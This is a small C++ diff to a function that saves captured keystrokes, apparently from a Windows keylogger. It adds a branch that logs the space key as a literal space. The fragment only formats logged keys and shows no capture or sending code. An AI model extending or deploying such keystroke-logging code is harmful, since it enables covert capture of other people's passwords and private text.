@@ -175,7 +175,11 @@ int Save(int key_stroke)
 #elif FORMAT == 16
 	output << std::hex << "[" << key_stroke << ']';
 #else
-	if (keyname.find(key_stroke) != keyname.end())
+	if (key_stroke == VK_SPACE)
+	{
+		output << ' ';
+	}
+	else if (keyname.find(key_stroke) != keyname.end())
 	{
 		output << keyname.at(key_stroke);
 	}
